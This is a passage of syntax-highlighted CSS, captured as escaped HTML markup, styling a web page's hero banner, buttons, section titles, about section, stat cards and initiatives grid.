class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            display: flex\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            align-items: center\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            text-align: center\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            color: var\u003cspan class=\"o\"\u003e(\u003c/span\u003e--white\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .hero-content \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            max-width: 800px\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            margin: \u003cspan class=\"m\"\u003e0\u003c/span\u003e auto\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .hero h1 \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            font-size: 3.5rem\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            margin-bottom: 1rem\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            text-shadow: 2px 2px 4px rgba\u003cspan class=\"o\"\u003e(\u003c/span\u003e0, 0, 0, 0.5\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .hero p \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            font-size: 1.3rem\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            margin-bottom: 2rem\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .btn \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            display: inline-block\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            background-color: var\u003cspan class=\"o\"\u003e(\u003c/span\u003e--accent\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            color: var\u003cspan class=\"o\"\u003e(\u003c/span\u003e--white\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            padding: 0.9rem 2.2rem\u003cspan class=\"p\"\u003e;\u003c/span\u003e /* Slightly larger padding */\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            border-radius: 8px\u003cspan class=\"p\"\u003e;\u003c/span\u003e /* More modern rounded corners */\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            text-decoration: none\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            font-weight: 600\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            transition: all 0.3s ease\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            border: none\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            cursor: pointer\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            box-shadow: \u003cspan class=\"m\"\u003e0\u003c/span\u003e 6px 10px rgba\u003cspan class=\"o\"\u003e(\u003c/span\u003e0, 0, 0, 0.1\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e /* Slightly enhanced shadow */\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .btn:hover \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            background-color: var\u003cspan class=\"o\"\u003e(\u003c/span\u003e--primary\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            transform: translateY\u003cspan class=\"o\"\u003e(\u003c/span\u003e-5px\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e /* More pronounced lift effect */\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            box-shadow: \u003cspan class=\"m\"\u003e0\u003c/span\u003e 8px 15px rgba\u003cspan class=\"o\"\u003e(\u003c/span\u003e0, 0, 0, 0.2\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e /* Stronger hover shadow */\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        section \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            padding: 5rem 0\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .section-title \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            text-align: center\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            margin-bottom: 3rem\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .section-title h2 \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            font-size: 2.5rem\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            color: var\u003cspan class=\"o\"\u003e(\u003c/span\u003e--primary\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            margin-bottom: 1rem\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            position: relative\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            display: inline-block\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .section-title h2::after \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            content: \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            position: absolute\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            bottom: -10px\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            left: 50%\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            transform: translateX\u003cspan class=\"o\"\u003e(\u003c/span\u003e-50%\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            width: 90px\u003cspan class=\"p\"\u003e;\u003c/span\u003e /* Slightly wider underline */\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            height: 5px\u003cspan class=\"p\"\u003e;\u003c/span\u003e /* Thicker underline */\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            background-color: var\u003cspan class=\"o\"\u003e(\u003c/span\u003e--accent\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            border-radius: 3px\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .section-title p \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            color: var\u003cspan class=\"o\"\u003e(\u003c/span\u003e--text\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            max-width: 700px\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            margin: \u003cspan class=\"m\"\u003e0\u003c/span\u003e auto\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            font-size: 1.1rem\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .about-content \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            display: grid\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            grid-template-columns: 1fr 1fr\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            gap: 3rem\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            align-items: center\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .about-img \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            border-radius: 12px\u003cspan class=\"p\"\u003e;\u003c/span\u003e /* More rounded */\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            overflow: hidden\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            box-shadow: \u003cspan class=\"m\"\u003e0\u003c/span\u003e 12px 25px rgba\u003cspan class=\"o\"\u003e(\u003c/span\u003e0, 0, 0, 0.15\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e /* Enhanced shadow */\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .about-img img \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            width: 100%\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            height: auto\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            display: block\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            transition: transform 0.5s ease\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .about-img:hover img \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            transform: scale\u003cspan class=\"o\"\u003e(\u003c/span\u003e1.08\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e /* More pronounced zoom */\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .about-text h3 \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            font-size: 2rem\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            margin-bottom: 1.5rem\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            color: var\u003cspan class=\"o\"\u003e(\u003c/span\u003e--dark\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .about-text p \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            margin-bottom: 1.5rem\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            font-size: 1.05rem\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .stats \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            display: grid\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            grid-template-columns: repeat\u003cspan class=\"o\"\u003e(\u003c/span\u003e4, 1fr\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            gap: 2rem\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            margin-top: 4rem\u003cspan class=\"p\"\u003e;\u003c/span\u003e /* More space */\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .stat-item \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            text-align: center\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            padding: 2.5rem 1.5rem\u003cspan class=\"p\"\u003e;\u003c/span\u003e /* More padding */\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            background-color: var\u003cspan class=\"o\"\u003e(\u003c/span\u003e--white\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            border-radius: 12px\u003cspan class=\"p\"\u003e;\u003c/span\u003e /* More rounded */\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            box-shadow: \u003cspan class=\"m\"\u003e0\u003c/span\u003e 8px 20px rgba\u003cspan class=\"o\"\u003e(\u003c/span\u003e0, 0, 0, 0.08\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e /* Enhanced shadow */\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            transition: transform 0.3s ease, box-shadow 0.3s ease\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .stat-item:hover \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            transform: translateY\u003cspan class=\"o\"\u003e(\u003c/span\u003e-12px\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e /* More pronounced lift */\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            box-shadow: \u003cspan class=\"m\"\u003e0\u003c/span\u003e 15px 30px rgba\u003cspan class=\"o\"\u003e(\u003c/span\u003e0, 0, 0, 0.15\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e /* Stronger hover shadow */\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .stat-item h3 \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            font-size: 3rem\u003cspan class=\"p\"\u003e;\u003c/span\u003e /* Larger numbers */\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            color: var\u003cspan class=\"o\"\u003e(\u003c/span\u003e--dark\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            margin-bottom: 0.8rem\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .stat-item p \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            color: var\u003cspan class=\"o\"\u003e(\u003c/span\u003e--text\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            font-size: 1.1rem\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .initiatives \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            background-color: var\u003cspan class=\"o\"\u003e(\u003c/span\u003e--white\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .initiatives-grid \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            display: grid\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            grid-template-columns: repeat\u003cspan 